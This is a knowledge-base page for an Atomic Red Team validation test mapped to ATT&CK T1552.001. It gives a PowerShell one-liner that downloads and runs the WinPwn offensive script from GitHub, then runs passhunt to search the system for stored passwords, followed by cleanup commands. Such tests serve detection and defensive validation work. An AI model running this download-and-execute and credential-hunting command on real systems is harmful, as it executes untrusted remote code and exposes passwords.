---
atomic_guid: "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797"
title: "WinPwn - passhunt"
framework: "atomic"
generated: "true"
attack_technique_id: "T1552.001"
attack_technique_name: "Unsecured Credentials: Credentials In Files"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797"
  - "WinPwn - passhunt"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Search for Passwords on this system using passhunt via WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1552-unsecured_credentials#^t1552001-credentials-in-files|T1552.001: Credentials In Files]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
passhunt -local $true -noninteractive
```

### Cleanup

```powershell
rm -force .\passhunt.exe -ErrorAction Ignore
rm -force .\phunter* -ErrorAction Ignore
rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml)
